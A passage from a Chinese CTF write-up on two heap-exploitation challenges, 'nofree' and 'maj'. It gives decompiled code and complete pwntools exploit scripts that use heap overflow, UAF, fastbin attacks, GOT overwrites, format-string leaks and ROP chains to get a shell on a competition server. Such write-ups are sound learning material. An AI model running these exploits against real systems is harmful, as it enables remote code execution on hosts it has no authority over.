class="keyword">return</span> strdup(chunk_array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 一个<code>edit</code>：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_idx();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * (<span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"content: "</span>);</span><br><span class="line">      result = read_str(*(<span class="keyword">void</span> **)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">256</span>], *(_QWORD *)&amp;chunk_array[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>显然这里<code>add</code>功能里输入的size，和<code>strdup</code>实际<code>malloc</code>出来的size并不一定是对应的，所以在<code>edit</code>的时候可以有heap overflow。</p></li><li><p>无<code>free</code>，就直接house of orange了，不过这里是把top chunk扔到<code>0x70</code>的fastbin里面去，然后利用heap overflow改fd指向bss上chunk array的地方，size是可以通过<code>new</code>功能那里控制的，正好可以控制分配到<code>chunk[1]</code>的位置而且不破坏<code>chunk[0]</code>，从而达到任意地址写。</p></li><li><p>因为同样没有<code>show</code>，这里我的思路是：</p><ul><li>改<code>atoi_got</code>为<code>printf_plt</code>，并且把<code>exit_got</code>改为<code>ret</code>，这样就可以利用<code>atoi</code>引入格式化字符串漏洞，同时<code>choice</code>错误的情况下能继续执行程序而不exit。</li><li>然后利用格式化字符串漏洞把<code>libc_read</code>和<code>stack address</code>全leak出来。</li></ul></li><li><p>由于查不到libc的版本，所以只能后面的思路就是想办法打syscall，但是ROPgadget是搜不到syscall的。这里就利用<code>libc_read + 0xe</code>的地方就是一个<code>syscall</code>的gadget，来进行后续的syscall调用。</p></li><li><p>至于<code>rdi</code>，<code>rsi</code>，<code>rdx</code>可以通过通用gadget控制，最关键的是<code>rax</code>，这里采用调用<code>read</code>的方法，因为函数的返回值等于读入的字符串的长度，所以只要控制读入<code>0x3b</code>长度字符串，就控制<code>rax = 0x3b</code>了。</p></li><li><p>最后就直接构造rop，利用任意地址写覆盖<code>edit</code>的返回地址即可。</p></li><li><p>拿完shell直接查靶机的libc：<code>Ubuntu GLIBC 2.23-0ubuntu11.2</code>，后面方便很多。</p></li><li><p>exp仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">12301</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_s</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"1\x00"</span>)</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"1"</span> * idx + <span class="string">'\x00'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, <span class="string">"%"</span> + str(size) + <span class="string">"c"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_s</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"choice&gt;&gt; "</span>, <span class="string">"11\x00"</span>)</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"idx: "</span>, <span class="string">"1"</span> * idx + <span class="string">"\x00"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">exit_got = elf.got[<span class="string">'exit'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">ret = <span class="number">0x00000000004006b9</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack chunk array</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">"AAA\x00"</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">"B"</span> * <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">"A"</span> * <span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">"A"</span> * <span class="number">0x88</span> + p64(<span class="number">0x81</span>))</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x38</span> + p64(<span class="number">0x81</span>) + p64(<span class="number">0x6020C0</span> + <span class="number">0x100</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x81</span>, <span class="string">"A"</span> * <span class="number">0x77</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x81</span>, <span class="string">"A"</span> * <span class="number">0x77</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write atoi_got table</span></span><br><span class="line">edit(<span class="number">0</span>, p64(atoi_got) + p64(<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line">edit_s(<span class="number">0</span>, p64(exit_got) + p64(<span class="number">0x100</span>))</span><br><span class="line">edit_s(<span class="number">1</span>, p64(ret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak read to get syscall gadget</span></span><br><span class="line">payload = <span class="string">"%7$s%8$s"</span> + p64(read_got) + p64(printf_got)</span><br><span class="line">p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, payload)</span><br><span class="line">libc_read = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">syscall = libc_read + <span class="number">0xE</span></span><br><span class="line">libc_printf = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">payload = <span class="string">"%12$p"</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice&gt;&gt; "</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">stack_addr = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write gadget</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c23</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400c21</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line">gadget_1 = <span class="number">0x400C00</span></span><br><span class="line">gadget_2 = <span class="number">0x400C16</span></span><br><span class="line"></span><br><span class="line">edit_s(<span class="number">0</span>, p64(stack_addr + <span class="number">8</span>) + p64(<span class="number">0x300</span>) + <span class="string">"/bin/sh\x00"</span> + p64(syscall))</span><br><span class="line">payload = flat([pop_rdi, <span class="number">0</span>, pop_rsi, stack_addr + <span class="number">0xB8</span>, <span class="number">0</span>, libc_read]) <span class="comment"># control rax</span></span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x6020C0</span>  + <span class="number">0x128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x6020C0</span> + <span class="number">0x120</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">edit_s(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400C00 loc_400C00: </span></span><br><span class="line"><span class="string">.text:0000000000400C00                 mov     rdx, r13</span></span><br><span class="line"><span class="string">.text:0000000000400C03                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400C06                 mov     edi, r15d</span></span><br><span class="line"><span class="string">.text:0000000000400C09                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400C0D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400C11                 cmp     rbx, rbp</span></span><br><span class="line"><span class="string">.text:0000000000400C14                 jnz     short loc_400C00</span></span><br><span class="line"><span class="string">.text:0000000000400C16</span></span><br><span class="line"><span class="string">.text:0000000000400C16 loc_400C16:                             ; CODE XREF: init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400C16                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:0000000000400C1A                 pop     rbx</span></span><br><span class="line"><span class="string">.text:0000000000400C1B                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000400C1C                 pop     r12</span></span><br><span class="line"><span class="string">.text:0000000000400C1E                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400C20                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400C22                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400C24                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_read: "</span> + hex(libc_read))</span><br><span class="line">success(<span class="string">"libc_printf: "</span> + hex(libc_printf))</span><br><span class="line">success(<span class="string">"stack_addr: "</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="maj"><a href="#maj" class="headerlink" title="maj"></a>maj</h1><ol><li><p>比较常规的利用方法，给了四个功能实际上只有三个有效，分别是：</p><ul><li><p><code>add</code>功能：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"please answer the question\n"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v8);</span><br><span class="line"><span class="keyword">if</span> ( !sub_400B2B(v8) )</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"you are right\n"</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; buf[i]; ++i )</span><br><span class="line">;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"full!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"______?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line"><span class="keyword">if</span> ( v7 &gt;= <span class="number">0</span> &amp;&amp; v7 &lt;= <span class="number">4096</span> )</span><br><span class="line">&#123;</span><br><span class="line">    buf[i] = <span class="built_in">malloc</span>(v7);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"start_the_game,yes_or_no?"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_603060, <span class="number">0x100</span>uLL);</span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_6033E0, v7, <span class="string">"%s"</span>, &amp;unk_603060);<span class="comment">// here</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">size</span>[i] = v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">size</span>[i] = v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  中间那部分基本不用管（整个过程下来没有影响），那个<code>answer question</code>只要简单爆一下就能知道80这个数字可用，后面基本就是根据输入的size去<code>malloc</code>一个chunk，然后通过<code>snprintf</code>把输入写到chunk里面，size写到bss上。</p></li><li><p><code>delete</code>:</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"index ?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line"><span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">31</span> &amp;&amp; buf[v3] )</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">free</span>(buf[v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  中间逻辑一样不用管，就是个直接<code>free</code>没有清空指针。</p></li><li><p><code>edit</code>：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index ?"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">31</span> &amp;&amp; buf[v3] )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"__new_content ?"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( val_100 &lt;= val_0 )</span><br><span class="line">      v0 = dword_603040;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v0 = val_0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= val_100 &amp;&amp; val_0 &gt; dword_603040 || dword_603040 &lt;= val_0 )</span><br><span class="line">      v1 = val_0;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     v1 = dword_603040;</span><br><span class="line">        val_0 = v1;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf[v3], <span class="built_in">size</span>[v3]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>显然这里存在一个uaf，直接先通过uaf，形成chunk overlap，使得同一个chunk同时存在于unsorted bin和fastbin（<code>size = 0x70</code>）中，这样<code>fastbin-&gt;fd = main_arena + 0x58</code>。</p></li><li><p>由于没有<code>show</code>，通用的办法就是通过上述构造，对<code>fastbin-&gt;fd</code>进行partial write 2 byte，所以只要bruteforce 4 bits，就能通过fastbin attack分配到<code>stdout</code>结构体的上方，然后将:</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line">_IO_read_ptr = <span class="number">0</span></span><br><span class="line">_IO_read_end = <span class="number">0</span></span><br><span class="line">_IO_read_base = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span>xXXXXXXXXXXXXXX00</span><br></pre></td></tr></table></figure><p> 就能leak出缓冲区的内存，从而leak出libc地址。</p></li><li><p>由于通过nofree那题拿到了libc版本，所以后面就是利用uaf打<code>__malloc_hook</code>为<code>onegadget</code>即可。</p></li><li><p>exp仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">15423</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please answer the question"</span>, str(num))</span><br><span class="line">    p.sendlineafter(<span class="string">'______?'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"start_the_game,yes_or_no?"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"__new_content ?"</span>, content)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 3 4 5 6</span></span><br><span class="line"></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">'\x10'</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 7</span></span><br><span class="line">        edit(<span class="number">7</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)) * <span class="number">2</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x28</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 8</span></span><br><span class="line">        edit(<span class="number">8</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xd1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x58</span>, <span class="string">"FFFF"</span>) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># bruteforce 4 bits</span></span><br><span class="line">        edit(<span class="number">3</span>, <span class="string">"\xdd\x55"</span>)</span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"GGGG"</span>) <span class="comment"># chunk 10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak</span></span><br><span class="line">        add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"HHHH"</span>) <span class="comment"># chunk 11</span></span><br><span class="line">        edit(<span class="number">11</span>, <span class="string">"\x00"</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recv(<span class="number">0x40</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c5600</span></span><br><span class="line">        __malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"failed"</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">15423</span>)</span><br><span class="line">        <span class="comment"># p = process(argv=[_proc], env=_setup_env())</span></span><br><span class="line"></span><br><span 